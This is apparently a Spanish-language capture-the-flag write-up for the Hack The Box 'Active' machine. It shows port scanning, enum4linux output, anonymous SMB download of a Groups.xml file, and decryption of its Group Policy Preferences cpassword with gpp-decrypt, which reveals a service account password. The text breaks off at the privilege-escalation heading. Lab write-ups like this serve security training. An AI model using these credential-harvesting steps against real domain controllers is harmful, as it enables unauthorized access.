# Active-HTB
Desarrollo de la VM ACTIVE de HACK THE BOX (HTB)

## 1. Configuración de la VM

- La VM se encuentra en estado de retirada de HTB
- Se debe activar la VM para poder usarla, se requiere una suscripción PREMIUM.

## 2. Escaneo de Puertos

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
```

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active1.jpg" width=80% />

## 3. Enumeración

### 3.1. Enumeración TCP/139

- Podemos enumerar utilizando ENUM4LINUX o AUTORECON.

```
# enum4linux -a -M -l -d 10.129.126.89   

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Mar 31 23:19:37 2022

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.129.126.89
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =====================================================
|    Enumerating Workgroup/Domain on 10.129.126.89    |
 =====================================================
[E] Can't find workgroup/domain


 =============================================
|    Nbtstat Information for 10.129.126.89    |
 =============================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
Looking up status of 10.129.126.89
No reply from 10.129.126.89

 ======================================
|    Session Check on 10.129.126.89    |
 ======================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Server 10.129.126.89 allows sessions using username '', password ''
[+] Got domain/workgroup name:

 ======================================================
|    Getting information via LDAP for 10.129.126.89    |
 ======================================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
[+] Long domain name for 10.129.126.89: active.htb
[+] 10.129.126.89 appears to be a root/parent DC

 ============================================
|    Getting domain SID for 10.129.126.89    |
 ============================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 =======================================
|    OS information on 10.129.126.89    |
 =======================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.129.126.89 from smbclient:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[+] Got OS info for 10.129.126.89 from srvinfo:
	10.129.126.89  Wk Sv PDC Tim NT     Domain Controller
	platform_id     :	500
	os version      :	6.1
	server type     :	0x80102b

 ==============================
|    Users on 10.129.126.89    |
 ==============================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ============================================
|    Machine Enumeration on 10.129.126.89    |
 ============================================
[E] Internal error.  Not implmented in this version of enum4linux.

 ==========================================
|    Share Enumeration on 10.129.126.89    |
 ==========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
do_connect: Connection to 10.129.126.89 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	Replication     Disk
	SYSVOL          Disk      Logon server share
	Users           Disk
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.129.126.89
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.126.89/ADMIN$	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.126.89/C$	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.126.89/IPC$	Mapping: OK	Listing: DENIED
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.126.89/NETLOGON	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.126.89/Replication	Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.126.89/SYSVOL	Mapping: DENIED, Listing: N/A
//10.129.126.89/Users	Mapping: DENIED, Listing: N/A

 =====================================================
|    Password Policy Information for 10.129.126.89    |
 =====================================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
[E] Unexpected error from polenum:


[+] Attaching to 10.129.126.89 using a NULL share

[+] Trying protocol 139/SMB...

[!] Protocol failed: Cannot request session (Called Name:10.129.126.89)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[E] Failed to get password policy with rpcclient


 ===============================
|    Groups on 10.129.126.89    |
 ===============================

[+] Getting builtin groups:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin group memberships:

[+] Getting local groups:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting local group memberships:

[+] Getting domain groups:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.

[+] Getting domain group memberships:

 ========================================================================
|    Users on 10.129.126.89 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.

 ==============================================
|    Getting printer info for 10.129.126.89    |
 ==============================================
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Thu Mar 31 23:21:30 2022
```

- Allí identificamos carpetas compartidas. La carpeta REPLICATION puede ser accedida.

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active2.jpg" width=80% />


### 3.2. Accediendo a Carpeta Compartida

- Accedemos a la carpeta compartida y descargamos su contenido de manera recursiva

```
┌──(root㉿kali)-[~/HT]
└─# smbclient \\\\10.129.126.89\\Replication
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

		5217023 blocks of size 4096. 275073 blocks available
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active3.jpg" width=80% />


- Verificamos su contenido y resalta el archivo Groups.xml

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active4.jpg" width=80% />


- El archivo Groups XML tiene un contraseña cifrada.

```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active5.jpg" width=80% />


## 4. Explotación

- Toca crackear la contraseña identificada.
- Busqué en GOOGLE información referencial y lo primero que encontré fue esto.

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active6.jpg" width=80% />

- De la lectura podemos resumir lo siguiente:
* El cifrado del password utiliza AES
* Microsoft publicó la llave AES
* Existen herramientas para descifrar contraseñas en archivos de configuración del AD

- Craking a la contraseña

```
┌──(root㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─# gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"      
GPPstillStandingStrong2k18
```

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active7.jpg" width=80% />


## 5. Elevando Privilegios

- Con el usuario y contraseña 










